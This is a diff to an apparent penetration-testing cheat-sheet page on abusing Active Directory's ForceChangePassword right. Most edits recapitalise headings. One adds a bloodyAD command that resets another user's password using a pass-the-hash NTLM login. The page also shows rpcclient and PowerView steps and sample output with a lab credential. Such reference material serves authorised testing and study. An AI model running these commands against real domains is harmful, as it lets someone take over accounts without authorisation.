@@ -4,20 +4,25 @@ date: 2024-7-18
 tags: ["Forcechangepassword", "Powerview", "Active Directory", "Windows", "bloodyAD"]
 ---
 
-### Change target user password (From Linux)
+### Change Target User Password (From Linux)
 
 {{< tab set1 tab1 >}}BloodyAD{{< /tab >}}
 {{< tab set1 tab2 >}}rpcclient{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
 ```console
-# Pass password or :hash into PASSWORD
+# Password
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
 ```
 
 ```console {class="sample-code"}
 bloodyAD -d object.local -u oliver -p 'c1cdfun_d2434' --host jenkins.object.local set password smith 'Test1234'
 [+] Password changed successfully!
+```
+
+```console
+# NTLM
+bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
 ```
 
 <small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>
@@ -35,7 +40,7 @@ $ rpcclient -U 'object.local/oliver%c1cdfun_d2434' 10.10.11.132 -c 'setuserinfo2
 
 {{< /tabcontent >}}
 
-### Change target user password (From Windows)
+### Change Target User Password (From Windows)
 
 {{< tab set2 tab1 >}}Windows{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
@@ -50,7 +55,7 @@ $ rpcclient -U 'object.local/oliver%c1cdfun_d2434' 10.10.11.132 -c 'setuserinfo2
 *Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
 ```
 
-#### 2. Create a cred object (runas) \[optional\]
+#### 2. Create a Cred Object (runas) \[Optional\]
 
 ```console
 $username = '<DOMAIN>\<USER>'
